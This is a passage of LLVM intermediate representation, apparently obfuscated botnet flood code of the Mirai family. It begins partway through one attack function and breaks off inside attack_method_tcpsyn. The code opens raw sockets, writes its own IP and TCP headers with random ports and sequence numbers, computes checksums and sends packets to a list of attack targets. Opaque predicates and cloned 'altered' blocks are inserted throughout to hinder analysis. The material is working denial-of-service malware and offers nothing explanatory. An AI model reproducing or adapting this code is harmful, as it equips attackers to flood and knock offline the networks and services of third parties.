  %455 = zext i16 %454 to i32
  %456 = icmp eq i32 %455, 65535
  br i1 %456, label %457, label %479

; <label>:457:                                    ; preds = %453
  %458 = load i32, i32* @x.31
  %459 = load i32, i32* @y.32
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %457
  %466 = call i32 @rand_next()
  %467 = and i32 %466, 65535
  %468 = trunc i32 %467 to i16
  %469 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 1
  store i16 %468, i16* %470, align 2
  %471 = load i32, i32* @x.31
  %472 = load i32, i32* @y.32
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart250, label %originalBB34alteredBB

originalBBpart250:                                ; preds = %originalBB34
  br label %479

; <label>:479:                                    ; preds = %originalBBpart250, %453
  %480 = load i32, i32* @x.31
  %481 = load i32, i32* @y.32
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %479
  %488 = load i32, i32* %26, align 4
  %489 = icmp eq i32 %488, 65535
  %490 = load i32, i32* @x.31
  %491 = load i32, i32* @y.32
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %489, label %498, label %502

; <label>:498:                                    ; preds = %originalBBpart254
  %499 = call i32 @rand_next()
  %500 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %501 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %500, i32 0, i32 2
  store i32 %499, i32* %501, align 4
  br label %502

; <label>:502:                                    ; preds = %498, %originalBBpart254
  %503 = load i32, i32* %27, align 4
  %504 = icmp eq i32 %503, 65535
  br i1 %504, label %505, label %525

; <label>:505:                                    ; preds = %502
  %506 = load i32, i32* @x.31
  %507 = load i32, i32* @y.32
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %505
  %514 = call i32 @rand_next()
  %515 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %516 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %515, i32 0, i32 3
  store i32 %514, i32* %516, align 4
  %517 = load i32, i32* @x.31
  %518 = load i32, i32* @y.32
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %525

; <label>:525:                                    ; preds = %originalBBpart258, %502
  %526 = load i32, i32* @x.31
  %527 = load i32, i32* @y.32
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %525
  %534 = load i8, i8* %35, align 1
  %535 = icmp ne i8 %534, 0
  %536 = load i32, i32* @x.31
  %537 = load i32, i32* @y.32
  %538 = sub i32 %536, 1
  %539 = mul i32 %536, %538
  %540 = urem i32 %539, 2
  %541 = icmp eq i32 %540, 0
  %542 = icmp slt i32 %537, 10
  %543 = or i1 %541, %542
  br i1 %543, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %535, label %544, label %563

; <label>:544:                                    ; preds = %originalBBpart262
  %545 = load i32, i32* @x.31
  %546 = load i32, i32* @y.32
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %544
  %553 = load i8*, i8** %43, align 8
  %554 = load i32, i32* %34, align 4
  call void @rand_str(i8* %553, i32 %554)
  %555 = load i32, i32* @x.31
  %556 = load i32, i32* @y.32
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %563

; <label>:563:                                    ; preds = %originalBBpart266, %originalBBpart262
  %564 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %565 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %564, i32 0, i32 7
  store i16 0, i16* %565, align 2
  %566 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %567 = bitcast %struct.iphdr* %566 to i16*
  %568 = call zeroext i16 @checksum_generic(i16* %567, i32 20)
  %569 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %570 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %569, i32 0, i32 7
  store i16 %568, i16* %570, align 2
  %571 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %572 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %571, i32 0, i32 6
  store i16 0, i16* %572, align 4
  %573 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %574 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %575 = bitcast %struct.tcphdr* %574 to i8*
  %576 = load i32, i32* %34, align 4
  %577 = sext i32 %576 to i64
  %578 = add i64 20, %577
  %579 = trunc i64 %578 to i16
  %580 = call zeroext i16 @htons(i16 zeroext %579) #7
  %581 = load i32, i32* %34, align 4
  %582 = sext i32 %581 to i64
  %583 = add i64 20, %582
  %584 = trunc i64 %583 to i32
  %585 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %573, i8* %575, i16 zeroext %580, i32 %584)
  %586 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 6
  store i16 %585, i16* %587, align 4
  %588 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %589 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %588, i32 0, i32 1
  %590 = load i16, i16* %589, align 2
  %591 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %592 = load i32, i32* %17, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %591, i64 %593
  %595 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %594, i32 0, i32 0
  %596 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %595, i32 0, i32 1
  store i16 %590, i16* %596, align 2
  %597 = load i32, i32* %18, align 4
  %598 = load i8*, i8** %40, align 8
  %599 = load i32, i32* %34, align 4
  %600 = sext i32 %599 to i64
  %601 = add i64 40, %600
  %602 = bitcast %union.__CONST_SOCKADDR_ARG* %44 to %struct.sockaddr**
  %603 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %604 = load i32, i32* %17, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %603, i64 %605
  %607 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %606, i32 0, i32 0
  %608 = bitcast %struct.sockaddr_in* %607 to %struct.sockaddr*
  store %struct.sockaddr* %608, %struct.sockaddr** %602, align 8
  %609 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %44, i32 0, i32 0
  %610 = load %struct.sockaddr*, %struct.sockaddr** %609, align 8
  %611 = call i64 @sendto(i32 %597, i8* %598, i64 %601, i32 16384, %struct.sockaddr* %610, i32 16)
  br label %612

; <label>:612:                                    ; preds = %563
  %613 = load i32, i32* @x.31
  %614 = load i32, i32* @y.32
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %612
  %621 = load i32, i32* %17, align 4
  %622 = add nsw i32 %621, 1
  store i32 %622, i32* %17, align 4
  %623 = load i32, i32* @x.31
  %624 = load i32, i32* @y.32
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBBpart274, label %originalBB68alteredBB

originalBBpart274:                                ; preds = %originalBB68
  br label %362

; <label>:631:                                    ; preds = %362
  %632 = load i32, i32* @x.31
  %633 = load i32, i32* @y.32
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %631
  %640 = load i32, i32* @x.31
  %641 = load i32, i32* @y.32
  %642 = sub i32 %640, 1
  %643 = mul i32 %640, %642
  %644 = urem i32 %643, 2
  %645 = icmp eq i32 %644, 0
  %646 = icmp slt i32 %641, 10
  %647 = or i1 %645, %646
  br i1 %647, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %345

; <label>:648:                                    ; preds = %130, %124
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %649 = alloca i8, align 1
  %650 = alloca %struct.attack_target*, align 8
  %651 = alloca i8, align 1
  %652 = alloca %struct.attack_option*, align 8
  %653 = alloca i32, align 4
  %654 = alloca i32, align 4
  %655 = alloca i8**, align 8
  %656 = alloca i8, align 1
  %657 = alloca i16, align 2
  %658 = alloca i8, align 1
  %659 = alloca i8, align 1
  %660 = alloca i16, align 2
  %661 = alloca i16, align 2
  %662 = alloca i32, align 4
  %663 = alloca i32, align 4
  %664 = alloca i8, align 1
  %665 = alloca i8, align 1
  %666 = alloca i8, align 1
  %667 = alloca i8, align 1
  %668 = alloca i8, align 1
  %669 = alloca i8, align 1
  %670 = alloca i32, align 4
  %671 = alloca i8, align 1
  %672 = alloca i32, align 4
  %673 = alloca %struct.iphdr*, align 8
  %674 = alloca %struct.tcphdr*, align 8
  %675 = alloca i8*, align 8
  %676 = alloca i8*, align 8
  %677 = alloca %struct.iphdr*, align 8
  %678 = alloca %struct.tcphdr*, align 8
  %679 = alloca i8*, align 8
  %680 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %649, align 1
  store %struct.attack_target* %1, %struct.attack_target** %650, align 8
  store i8 %2, i8* %651, align 1
  store %struct.attack_option* %3, %struct.attack_option** %652, align 8
  %681 = load i8, i8* %649, align 1
  %682 = zext i8 %681 to i64
  %683 = call noalias i8* @calloc(i64 %682, i64 8) #6
  %684 = bitcast i8* %683 to i8**
  store i8** %684, i8*** %655, align 8
  %685 = load i8, i8* %651, align 1
  %686 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %687 = call i32 @attack_get_opt_int(i8 zeroext %685, %struct.attack_option* %686, i8 zeroext 2, i32 0)
  %688 = trunc i32 %687 to i8
  store i8 %688, i8* %656, align 1
  %689 = load i8, i8* %651, align 1
  %690 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %691 = call i32 @attack_get_opt_int(i8 zeroext %689, %struct.attack_option* %690, i8 zeroext 3, i32 65535)
  %692 = trunc i32 %691 to i16
  store i16 %692, i16* %657, align 2
  %693 = load i8, i8* %651, align 1
  %694 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %695 = call i32 @attack_get_opt_int(i8 zeroext %693, %struct.attack_option* %694, i8 zeroext 4, i32 64)
  %696 = trunc i32 %695 to i8
  store i8 %696, i8* %658, align 1
  %697 = load i8, i8* %651, align 1
  %698 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %699 = call i32 @attack_get_opt_int(i8 zeroext %697, %struct.attack_option* %698, i8 zeroext 5, i32 0)
  %700 = trunc i32 %699 to i8
  store i8 %700, i8* %659, align 1
  %701 = load i8, i8* %651, align 1
  %702 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %703 = call i32 @attack_get_opt_int(i8 zeroext %701, %struct.attack_option* %702, i8 zeroext 6, i32 65535)
  %704 = trunc i32 %703 to i16
  store i16 %704, i16* %660, align 2
  %705 = load i8, i8* %651, align 1
  %706 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %707 = call i32 @attack_get_opt_int(i8 zeroext %705, %struct.attack_option* %706, i8 zeroext 7, i32 65535)
  %708 = trunc i32 %707 to i16
  store i16 %708, i16* %661, align 2
  %709 = load i8, i8* %651, align 1
  %710 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %711 = call i32 @attack_get_opt_int(i8 zeroext %709, %struct.attack_option* %710, i8 zeroext 17, i32 65535)
  store i32 %711, i32* %662, align 4
  %712 = load i8, i8* %651, align 1
  %713 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %714 = call i32 @attack_get_opt_int(i8 zeroext %712, %struct.attack_option* %713, i8 zeroext 18, i32 65535)
  store i32 %714, i32* %663, align 4
  %715 = load i8, i8* %651, align 1
  %716 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %717 = call i32 @attack_get_opt_int(i8 zeroext %715, %struct.attack_option* %716, i8 zeroext 11, i32 0)
  %718 = trunc i32 %717 to i8
  store i8 %718, i8* %664, align 1
  %719 = load i8, i8* %651, align 1
  %720 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %721 = call i32 @attack_get_opt_int(i8 zeroext %719, %struct.attack_option* %720, i8 zeroext 12, i32 1)
  %722 = trunc i32 %721 to i8
  store i8 %722, i8* %665, align 1
  %723 = load i8, i8* %651, align 1
  %724 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %725 = call i32 @attack_get_opt_int(i8 zeroext %723, %struct.attack_option* %724, i8 zeroext 13, i32 0)
  %726 = trunc i32 %725 to i8
  store i8 %726, i8* %666, align 1
  %727 = load i8, i8* %651, align 1
  %728 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %729 = call i32 @attack_get_opt_int(i8 zeroext %727, %struct.attack_option* %728, i8 zeroext 14, i32 0)
  %730 = trunc i32 %729 to i8
  store i8 %730, i8* %667, align 1
  %731 = load i8, i8* %651, align 1
  %732 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %733 = call i32 @attack_get_opt_int(i8 zeroext %731, %struct.attack_option* %732, i8 zeroext 15, i32 0)
  %734 = trunc i32 %733 to i8
  store i8 %734, i8* %668, align 1
  %735 = load i8, i8* %651, align 1
  %736 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %737 = call i32 @attack_get_opt_int(i8 zeroext %735, %struct.attack_option* %736, i8 zeroext 16, i32 0)
  %738 = trunc i32 %737 to i8
  store i8 %738, i8* %669, align 1
  %739 = load i8, i8* %651, align 1
  %740 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %741 = call i32 @attack_get_opt_int(i8 zeroext %739, %struct.attack_option* %740, i8 zeroext 0, i32 1458)
  store i32 %741, i32* %670, align 4
  %742 = load i8, i8* %651, align 1
  %743 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %744 = call i32 @attack_get_opt_int(i8 zeroext %742, %struct.attack_option* %743, i8 zeroext 1, i32 1)
  %745 = trunc i32 %744 to i8
  store i8 %745, i8* %671, align 1
  %746 = load i8, i8* %651, align 1
  %747 = load %struct.attack_option*, %struct.attack_option** %652, align 8
  %748 = load i32, i32* @LOCAL_ADDR, align 4
  %749 = call i32 @attack_get_opt_ip(i8 zeroext %746, %struct.attack_option* %747, i8 zeroext 25, i32 %748)
  store i32 %749, i32* %672, align 4
  %750 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %750, i32* %654, align 4
  %751 = icmp eq i32 %750, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %186
  %752 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %753 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %754 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %753, i32 0, i32 4
  store i16 %752, i16* %754, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %300
  %755 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %756 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %755, i32 0, i32 4
  %757 = load i16, i16* %756, align 4
  %_ = sub i16 0, %757
  %gen = add i16 %_, -2049
  %_7 = sub i16 %757, -2049
  %gen8 = mul i16 %_7, -2049
  %_9 = sub i16 %757, -2049
  %gen10 = mul i16 %_9, -2049
  %_11 = shl i16 %757, -2049
  %_12 = sub i16 0, %757
  %gen13 = add i16 %_12, -2049
  %758 = and i16 %757, -2049
  %_14 = sub i16 0, %758
  %gen15 = add i16 %_14, 2048
  %_16 = sub i16 0, %758
  %gen17 = add i16 %_16, 2048
  %_18 = shl i16 %758, 2048
  %759 = or i16 %758, 2048
  store i16 %759, i16* %756, align 4
  br label %originalBB6

originalBB22alteredBB:                            ; preds = %originalBB22, %328
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %345
  store i32 0, i32* %17, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %410
  %760 = load i32, i32* %36, align 4
  %761 = icmp eq i32 %760, -1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %457
  %762 = call i32 @rand_next()
  %_35 = sub i32 0, %762
  %gen36 = add i32 %_35, 65535
  %_37 = shl i32 %762, 65535
  %_38 = sub i32 %762, 65535
  %gen39 = mul i32 %_38, 65535
  %_40 = sub i32 %762, 65535
  %gen41 = mul i32 %_40, 65535
  %_42 = sub i32 %762, 65535
  %gen43 = mul i32 %_42, 65535
  %_44 = shl i32 %762, 65535
  %_45 = sub i32 %762, 65535
  %gen46 = mul i32 %_45, 65535
  %_47 = sub i32 %762, 65535
  %gen48 = mul i32 %_47, 65535
  %763 = and i32 %762, 65535
  %764 = trunc i32 %763 to i16
  %765 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %766 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %765, i32 0, i32 1
  store i16 %764, i16* %766, align 2
  br label %originalBB34

originalBB52alteredBB:                            ; preds = %originalBB52, %479
  %767 = load i32, i32* %26, align 4
  %768 = icmp eq i32 %767, 65535
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %505
  %769 = call i32 @rand_next()
  %770 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %771 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %770, i32 0, i32 3
  store i32 %769, i32* %771, align 4
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %525
  %772 = load i8, i8* %35, align 1
  %773 = icmp ne i8 %772, 0
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %544
  %774 = load i8*, i8** %43, align 8
  %775 = load i32, i32* %34, align 4
  call void @rand_str(i8* %774, i32 %775)
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %612
  %776 = load i32, i32* %17, align 4
  %_69 = sub i32 0, %776
  %gen70 = add i32 %_69, 1
  %_71 = sub i32 %776, 1
  %gen72 = mul i32 %_71, 1
  %777 = add nsw i32 %776, 1
  store i32 %777, i32* %17, align 4
  br label %originalBB68

originalBB76alteredBB:                            ; preds = %originalBB76, %631
  br label %originalBB76
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.33
  %6 = load i32, i32* @y.34
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca %struct.iphdr*, align 8
  %36 = alloca %struct.tcphdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %42 = load i8, i8* %13, align 1
  %43 = zext i8 %42 to i64
  %44 = call noalias i8* @calloc(i64 %43, i64 8) #6
  %45 = bitcast i8* %44 to i8**
  store i8** %45, i8*** %19, align 8
  %46 = load i8, i8* %15, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 2, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %20, align 1
  %50 = load i8, i8* %15, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 3, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %21, align 2
  %54 = load i8, i8* %15, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 4, i32 64)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %22, align 1
  %58 = load i8, i8* %15, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 5, i32 1)
  %61 = trunc i32 %60 to i8
  store i8 %61, i8* %23, align 1
  %62 = load i8, i8* %15, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 6, i32 65535)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %24, align 2
  %66 = load i8, i8* %15, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 7, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %25, align 2
  %70 = load i8, i8* %15, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 17, i32 65535)
  store i32 %72, i32* %26, align 4
  %73 = load i8, i8* %15, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 18, i32 0)
  store i32 %75, i32* %27, align 4
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 11, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %28, align 1
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 12, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %29, align 1
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 13, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %30, align 1
  %88 = load i8, i8* %15, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 14, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %31, align 1
  %92 = load i8, i8* %15, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 15, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %32, align 1
  %96 = load i8, i8* %15, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 16, i32 0)
  %99 = trunc i32 %98 to i8
  store i8 %99, i8* %33, align 1
  %100 = load i8, i8* %15, align 1
  %101 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %102 = load i32, i32* @LOCAL_ADDR, align 4
  %103 = call i32 @attack_get_opt_ip(i8 zeroext %100, %struct.attack_option* %101, i8 zeroext 25, i32 %102)
  store i32 %103, i32* %34, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %104, i32* %18, align 4
  %105 = icmp eq i32 %104, -1
  %106 = load i32, i32* @x.33
  %107 = load i32, i32* @y.34
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %105, label %114, label %115

; <label>:114:                                    ; preds = %originalBBpart2
  br label %629

; <label>:115:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %116 = load i32, i32* %18, align 4
  %117 = bitcast i32* %17 to i8*
  %118 = call i32 @setsockopt(i32 %116, i32 0, i32 3, i8* %117, i32 4) #6
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %120, label %139

; <label>:120:                                    ; preds = %115
  %121 = load i32, i32* @x.33
  %122 = load i32, i32* @y.34
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %120
  %129 = load i32, i32* %18, align 4
  %130 = call i32 @close(i32 %129)
  %131 = load i32, i32* @x.33
  %132 = load i32, i32* @y.34
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %629

; <label>:139:                                    ; preds = %115
  store i32 0, i32* %17, align 4
  br label %140

; <label>:140:                                    ; preds = %originalBBpart250, %139
  %141 = load i32, i32* %17, align 4
  %142 = load i8, i8* %13, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp slt i32 %141, %143
  br i1 %144, label %145, label %368

; <label>:145:                                    ; preds = %140
  %146 = load i32, i32* @x.33
  %147 = load i32, i32* @y.34
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %145
  %154 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %155 = load i8**, i8*** %19, align 8
  %156 = load i32, i32* %17, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i8*, i8** %155, i64 %157
  store i8* %154, i8** %158, align 8
  %159 = load i8**, i8*** %19, align 8
  %160 = load i32, i32* %17, align 4
